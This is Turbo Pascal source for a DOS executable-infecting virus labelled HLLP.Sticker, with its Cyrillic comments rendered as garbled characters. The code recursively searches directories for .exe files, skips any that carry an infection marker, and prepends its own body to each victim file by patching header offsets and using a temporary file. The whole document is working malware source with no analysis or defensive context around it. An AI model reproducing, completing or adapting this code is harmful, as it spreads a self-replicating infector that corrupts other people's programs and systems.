   {‚¨àãá HLLP.Sticker}
   {$I-}
   uses dos;
   type
    arr=array[0..29999]of char;
   var
    i:integer;
    df0,df1,df2,dfr:longint;
    zag1,zag2:array[0..31]of word;
    k,k1,k2:word;
    a:^arr;
    n,n1,n2:file;

   procedure smes(var i1,i:word;var e:longint);
   begin
    i:=0;
    i1:=0;
    while e>$ffff do
     begin
      e:=e-$10000;
      inc(i)
     end;
    i1:=e;
   end;

   procedure smesd(var i1,i:word;var e:longint);
   begin
    i:=0;
    i1:=0;
    while e>$fff0 do
     begin
      e:=e-$ffff0;
      inc(i)
     end;
    i1:=e;
   end;

   procedure zar(name1,name3:string);
    const
     name2:string[3]='aaa';  {ˆ¬ï ¢à¥¬¥®£® ä ©« }
     size=7088;
    begin
     assign(n2,name3);
     rename(n2,name2);

     new(a);
     { n=_open("r.exe",0); }
     assign(n1,name1);
     reset(n1,1);
     { df0=filelength(n);  }
     df0:=1492;
     k:=1492;
     { k=_read(n,a,30000); }
     { close(n);           }
     blockread(n1,a^,k);
     assign(n2,name3);
     rewrite(n2,1);
     blockwrite(n2,a^,k);
     close(n1);
     { *ã«¥¢®©  ä ©« áª®¯¨à®¢  }
     assign(n1,name2);
     reset(n1,1);
     df1:=filesize(n1);
     blockread(n1,zag1,$1e,k);
     seek(n1,0);
     blockread(n1,a^,30000,k);
     repeat
      blockwrite(n2,a^,k);
      blockread(n1,a^,30000,k)
     until k=0;
     close(n1);
     {‚ëç¨á«¥¨¥ ¯ à ¬¥âà®¢ § à ¦¥®£® ä ©« }
     assign(n1,name1);
     reset(n1,1);
     df2:=size;
     seek(n1,$2d6);
     blockread(n1,k2,2);
     blockread(n1,k1,2);
     seek(n1,k1*$10000+k2);
     blockread(n1,zag2,$1e,k);
     seek(n1,k1*$10000+k2);
     blockread(n1,a^,30000,k);
     repeat
      blockwrite(n2,a^,k);
      blockread(n1,a^,30000,k)
     until k=0;
     close(n1);
     close(n2);
     { ¨¬ï § ¤ ç¨ }
     assign(n,name3);
     reset(n,1);
     seek(n,$312);
     i:=length(name3);
     blockwrite(n,name3[1],i);
     { à §¬¥à ã¯à ¢«ïîé¥© ç áâ¨ }
     i:=df0;
     seek(n,$2cc);
     blockwrite(n,i,2);   { r }
     { ¯¥à¢ ï § ¤ ç  }
     dfr:=df1-zag1[4]*16;
     smesd(k,k1,dfr);
     seek(n,$2ce);        { r1 }
     blockwrite(n,k,2);   { ¤«¨  }
     blockwrite(n,k1,2);

     dfr:=df0+zag1[4]*16;
     smes(k,k1,dfr);
     seek(n,$2d2);        { rf1 }
     blockwrite(n,k,2);   { á¬¥é¥¨¥ }
     blockwrite(n,k1,2);

     dfr:=df0+zag1[12];
     smes(k,k1,dfr);
     seek(n,$2e2);        { tab1 }
     blockwrite(n,k,2);
     blockwrite(n,k1,2);
    {full}
     dfr:=df0+df1;
     smes(k,k1,dfr);
     seek(n,$2d6);        { r20 }
     blockwrite(n,k,2);
     blockwrite(n,k1,2);
    {2}
     dfr:=df2-zag2[4]*16;
     smesd(k,k1,dfr);
     seek(n,$2da);        { r2 }
     blockwrite(n,k,2);   { ¤«¨  }
     blockwrite(n,k1,2);

     dfr:=df0+df1+zag2[4]*16;
     smes(k,k1,dfr);
     seek(n,$2de);        { rf2 }
     blockwrite(n,k,2);   { á¬¥é¥¨¥ }
     blockwrite(n,k1,2);

     dfr:=df0+df1+zag2[12];
     smes(k,k1,dfr);
     seek(n,$2e6);        { tab2 }
     blockwrite(n,k,2);   { á¬¥é¥¨¥ â ¡«¨æë ¯¥à¥¬¥é¥¨ï }
     blockwrite(n,k1,2);
     close(n);

     dispose(a);          {®á¢®¡®¤¨âì ¯ ¬ïâì}
     assign(n2,name2);
     erase(n2);           {áâ¥à¥âì ¢à¥¬¥ë© ä ©«}
    end;


   var
    st:string;

   procedure infectall;
   var
    fl:searchrec;
    f:file;
    s:array[1..4]of char;
   begin
    findfirst('*.exe',$20,fl);
    while doserror=0 do
    begin
     assign(f,fl.name);
     reset(f,1);
     blockread(f,s,4);
     close(f);
     if s<>'MZ'#$D4#1 then        {…é¥ ¥ § à ¦¥?}
      begin
       zar(paramstr(0),fl.name);  {*¥ § à ¦¥... ¯®ª }
       chdir(st);
       halt;
      end;
     findnext(fl);                {’®£¤  á«¥¤ãîé¨©}
    end;
   end;

   procedure find;
   var
    fl:searchrec;
   begin
    infectall;                              {…áâì ¥§ à ¦¥ë¥ ä ©«ë?}
    findfirst('*',$10,fl);                  {’®£¤  ¯®è«¨ ¤ «ìè¥}
    while fl.name[1]='.' do findnext(fl);
    while doserror=0 do
     begin
      chdir(fl.name);
      find;
      findnext(fl);
     end;
    chdir('..');                            {’ ¬ ¥â? ’®£¤  ¯®è«¨  § ¤}
   end;

   begin
    getdir(0,st);          {‡ ¯®¬¨¬ £¤¥ ¬ë ¦¨¢¥¬}
    repeat
     chdir('..');
     find;
    until ioresult<>0;
    chdir(st);             {€ ¥§ à ¦¥ëå ä ©«®¢ ¡®«ìè¥ ¥â... Ž¡¨¤®, ¤ ?}
   end.
